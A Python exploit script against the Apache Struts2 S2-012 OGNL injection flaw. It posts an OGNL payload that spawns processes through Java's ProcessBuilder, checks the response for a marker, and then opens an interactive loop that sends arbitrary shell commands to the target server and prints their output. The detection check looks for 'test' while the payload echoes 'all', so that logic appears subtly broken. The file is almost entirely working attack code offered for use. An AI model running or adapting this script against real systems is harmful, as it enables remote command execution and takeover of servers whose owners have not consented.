import requests

headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0'}


def s2_012(url):
    # Struts2： 2.1.0-2.3.13
    payload = '%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"echo","all"})).redirectErrorStream(true).start(),'
    payload += '#b=#a.getInputStream(),'
    payload += '#c=new java.io.InputStreamReader(#b),'
    payload += '#d=new java.io.BufferedReader(#c),'
    payload += '#e=new char[500],#d.read(#e),'
    payload += '#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e))'
    payload += ',#f.getWriter().flush(),#f.getWriter().close()}&currentSkill.description=aaaa'

    data = {
        'name': payload
    }

    s = requests.post(url=url, data=data, headers=headers)
    if len(s.text) != None and 'test' in s.text:
        print("存在s2-012漏洞")
        s2_012exp(url)
    else:
        pass


def s2_012exp(url):
    payload = '#b=#a.getInputStream(),'
    payload += '#c=new java.io.InputStreamReader(#b),'
    payload += '#d=new java.io.BufferedReader(#c),'
    payload += '#e=new char[500],#d.read(#e),'
    payload += '#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e))'
    payload += ',#f.getWriter().flush(),#f.getWriter().close()}&currentSkill.description=aaaa'
    while True:
        exec = input("exec:")
        get_exec = str.split(exec, " ")
        finish_key = '%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{' + ','.join(
            '"' + item + '"' for item in get_exec) + '})).redirectErrorStream(true).start(),'
        finish_payload = finish_key + payload
        data = {
            'name': finish_payload
        }
        page = requests.post(url=url, data=data, headers=headers)
        print(page.text)


if __name__ == '__main__':
    url = input("test url:")
    s2_012(url)
